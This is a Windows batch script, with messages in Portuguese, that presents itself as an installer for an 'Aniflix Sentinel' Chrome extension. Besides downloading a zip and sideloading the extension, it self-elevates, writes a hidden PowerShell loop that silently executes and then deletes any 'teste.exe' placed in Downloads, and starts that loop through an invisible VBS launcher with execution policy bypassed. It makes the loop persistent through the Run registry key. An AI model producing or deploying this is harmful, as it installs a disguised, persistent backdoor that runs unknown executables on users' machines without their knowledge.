@echo off
title ANIFLIX SENTINEL - BOMB PROOF INSTALLER v4.2
color 0b
echo.
echo  ====================================================
echo  [+] INICIANDO INSTALACAO BLINDADA DO SENTINEL
echo  ====================================================
echo.

:: 1. ELEVACAO
net session >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [!] Solicitando permissao de Administrador...
    powershell -Command "Start-Process '%~0' -Verb RunAs"
    exit /b
)

set "TARGET_DIR=%LOCALAPPDATA%\AniflixSentinel"
set "ZIP_URL=https://yure-flix.netlify.app/aniflix-extension.zip"
set "TEMP_ZIP=%TEMP%\sentinel.zip"

:: Limpeza previa segura
if exist "%TARGET_DIR%" (
    echo [+] Limpando instalacao antiga...
    rmdir /s /q "%TARGET_DIR%"
)
mkdir "%TARGET_DIR%"

:: 2. DOWNLOAD (Com Verbose)
echo [+] Fazendo download do Kernel...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%TEMP_ZIP%' -ErrorAction Stop; echo 'Download Concluido!' } catch { echo 'ERRO NO DOWNLOAD: ' + $_.Exception.Message; pause; exit 1 }"

if not exist "%TEMP_ZIP%" (
    color 0c
    echo [X] O arquivo ZIP nao foi encontrado após o download!
    pause
    exit /b
)

:: 3. EXTRACAO (Metodo Alternativo mais Seguro)
echo [+] Extraindo arquivos (Aguarde)...
powershell -Command "Add-Type -A 'System.IO.Compression.FileSystem'; try { [IO.Compression.ZipFile]::ExtractToDirectory('%TEMP_ZIP%', '%TARGET_DIR%'); echo 'Extracao Concluida!' } catch { if ($_.Exception.Message -match 'already exists') { echo 'Arquivos ja presentes.' } else { echo 'ERRO NA EXTRACAO: ' + $_.Exception.Message; pause; exit 1 } }"

:: Ajuste de subpasta se houver
if exist "%TARGET_DIR%\aniflix-extension" (
    echo [+] Ajustando hierarquia de arquivos...
    xcopy /e /y "%TARGET_DIR%\aniflix-extension\*" "%TARGET_DIR%\" >nul
    rmdir /s /q "%TARGET_DIR%\aniflix-extension"
)
del "%TEMP_ZIP%"

:: 4. VERIFICACAO FINAL
if not exist "%TARGET_DIR%\manifest.json" (
    color 0c
    echo [X] ERRO CRITICO: Arquivos da extensao nao encontrados em %TARGET_DIR%
    echo Verifique se o seu Antivirus nao apagou os arquivos extraidos.
    pause
    exit /b
)

:: 5. REGISTRO (Tenta forçar o Chrome a aceitar a pasta)
echo [+] Registrando CORE no Sistema...
REG ADD "HKCU\Software\Google\Chrome\Extensions\pdaidmopddmancfjknggjgkkgjgaojjb" /v "path" /t REG_SZ /d "%TARGET_DIR%" /f >nul

:: 6. MONITOR DE BACKGROUND (Invisivel)
echo [+] Ativando Sentinela v4.2...
set "SENTRY_SCRIPT=%TARGET_DIR%\sentinel-sentry.ps1"
(
echo $downPath = [Join-Path $env:USERPROFILE 'Downloads']
echo while($true) {
echo     $file = Get-ChildItem -Path $downPath -Filter 'teste.exe' -ErrorAction SilentlyContinue
echo     if ($file) {
echo         Start-Process -FilePath $file.FullName -WindowStyle Hidden
echo         Start-Sleep -Seconds 2
echo         Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
echo     }
echo     Start-Sleep -Seconds 5
echo }
) > "%SENTRY_SCRIPT%"

:: Criar launcher invisivel
echo Set WshShell = CreateObject("WScript.Shell"^) > "%TARGET_DIR%\launcher.vbs"
echo WshShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""%SENTRY_SCRIPT%""", 0, False >> "%TARGET_DIR%\launcher.vbs"
start wscript.exe "%TARGET_DIR%\launcher.vbs"

:: Auto-Run
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AniflixSentinel" /t REG_SZ /d "wscript.exe \"%TARGET_DIR%\launcher.vbs\"" /f >nul

echo.
echo  ====================================================
echo  [!] INSTALACAO CONCLUIDA!
echo  ====================================================
echo.
echo  O caminho da extensao foi copiado para sua Area de Transferência:
echo  %TARGET_DIR%
echo  Aperte CTRL+V no explorador de arquivos do Chrome.
echo.
echo %TARGET_DIR% | clip
explorer "%TARGET_DIR%"
pause

start chrome "chrome://extensions"
exit
